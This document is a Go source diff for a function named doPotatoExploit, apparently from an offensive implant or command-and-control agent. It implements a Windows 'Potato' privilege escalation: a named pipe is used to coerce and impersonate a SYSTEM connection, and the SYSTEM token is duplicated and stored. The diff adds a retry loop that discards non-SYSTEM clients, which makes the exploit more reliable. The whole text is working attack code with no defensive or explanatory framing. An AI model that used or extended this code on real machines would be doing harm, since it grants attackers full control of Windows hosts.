@@ -563,25 +563,130 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
 	}
 
-	// Phase 7: Wait for pipe connection (SYSTEM connecting via synchronous goroutine)
+	// Phase 7-8: Accept pipe connections and look for SYSTEM.
+	// Our own process's COM runtime may connect first (NETWORK SERVICE),
+	// so we loop: accept → check identity → if not SYSTEM, disconnect and retry.
 	atomic.StoreInt32(phase, 7)
-	pipeOk := false
-	select {
-	case pipeOk = <-pipeConnected:
-		// ConnectNamedPipe returned
-	case <-time.After(10 * time.Second):
-		// Timeout — close pipe to unblock the ConnectNamedPipe goroutine
-		pipeOk = false
+
+	systemSID, _ := windows.StringToSid("S-1-5-18") // NT AUTHORITY\SYSTEM
+	deadline := time.After(15 * time.Second)
+	var dupToken windows.Token
+	var clientIdentity string
+	gotSystem := false
+	attempts := 0
+	const maxAttempts = 5
+
+	for attempts < maxAttempts && !gotSystem {
+		attempts++
+
+		// Wait for a connection (synchronous ConnectNamedPipe in goroutine)
+		pipeOk := false
+		if attempts == 1 {
+			// First attempt: use the goroutine already started in Phase 4
+			select {
+			case pipeOk = <-pipeConnected:
+			case <-deadline:
+			}
+		} else {
+			// Subsequent attempts: start a new ConnectNamedPipe
+			ch := make(chan bool, 1)
+			go func() {
+				ret, _, cErr := procConnectNamedPipe.Call(hPipe, 0)
+				connected := ret != 0
+				if !connected {
+					if errno, ok := cErr.(syscall.Errno); ok && errno == 535 {
+						connected = true
+					}
+				}
+				ch <- connected
+			}()
+			select {
+			case pipeOk = <-ch:
+			case <-deadline:
+			}
+		}
+
+		if !pipeOk {
+			break
+		}
+
+		// Impersonate and check identity
+		atomic.StoreInt32(phase, 8)
+		ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
+		if ret == 0 {
+			procDisconnectNamedPipe.Call(hPipe)
+			if attempts >= maxAttempts {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed on attempt %d: %v", attempts, impErr),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			continue
+		}
+
+		// Check if the client is SYSTEM
+		var threadToken windows.Token
+		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
+		if err != nil {
+			err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
+		}
+		if err != nil {
+			procRevertToSelf.Call()
+			procDisconnectNamedPipe.Call(hPipe)
+			continue
+		}
+
+		tokenUser, tuErr := threadToken.GetTokenUser()
+		if tuErr != nil {
+			threadToken.Close()
+			procRevertToSelf.Call()
+			procDisconnectNamedPipe.Call(hPipe)
+			continue
+		}
+
+		isSystem := tokenUser.User.Sid.Equals(systemSID)
+		clientIdentity, _ = GetCurrentIdentity()
+
+		if !isSystem {
+			// Not SYSTEM — disconnect and try next connection
+			threadToken.Close()
+			procRevertToSelf.Call()
+			procDisconnectNamedPipe.Call(hPipe)
+			continue
+		}
+
+		// Got SYSTEM! Duplicate to primary token
+		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
+			windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
+		if err != nil {
+			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
+				windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
+		}
+		threadToken.Close()
+		procRevertToSelf.Call()
+		procDisconnectNamedPipe.Call(hPipe)
+
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		gotSystem = true
 	}
-	if !pipeOk {
+
+	if !gotSystem {
 		hookStatus := "NOT called"
 		if wasHookCalled() {
-			hookStatus = "CALLED (DSA returned but RPCSS didn't connect)"
+			hookStatus = "CALLED"
 		}
 		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
-		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nBinding: %s\nHook was %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x",
-			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
-			oxid, oid, ipid)
+		errMsg := fmt.Sprintf("Did not receive SYSTEM connection after %d attempts.\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x\nLast client: %s",
+			attempts, pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
+			oxid, oid, ipid, clientIdentity)
 		if triggerErr != nil {
 			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
 		} else {
@@ -594,64 +699,11 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		}
 	}
 
-	// Phase 8: Impersonate the SYSTEM token
-	atomic.StoreInt32(phase, 8)
-	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
-	if ret == 0 {
-		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateNamedPipeClient: %v", impErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	clientIdentity, _ := GetCurrentIdentity()
-
-	// Capture thread token
-	var threadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
-	if err != nil {
-		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
-	}
-	if err != nil {
-		procRevertToSelf.Call()
-		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Connected as %s but failed to capture token: %v", clientIdentity, err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Duplicate to primary token
-	var dupToken windows.Token
-	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
-		windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
-	if err != nil {
-		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
-			windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
-	}
-	threadToken.Close()
-
-	if err != nil {
-		procRevertToSelf.Call()
-		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	procRevertToSelf.Call()
-	procDisconnectNamedPipe.Call(hPipe)
-
-	// Store token
+	// Store SYSTEM token
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
 		windows.CloseHandle(windows.Handle(dupToken))
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Connected as %s but SetIdentityToken: %v", clientIdentity, setErr),
+			Output:    fmt.Sprintf("Connected as SYSTEM but SetIdentityToken: %v", setErr),
 			Status:    "error",
 			Completed: true,
 		}
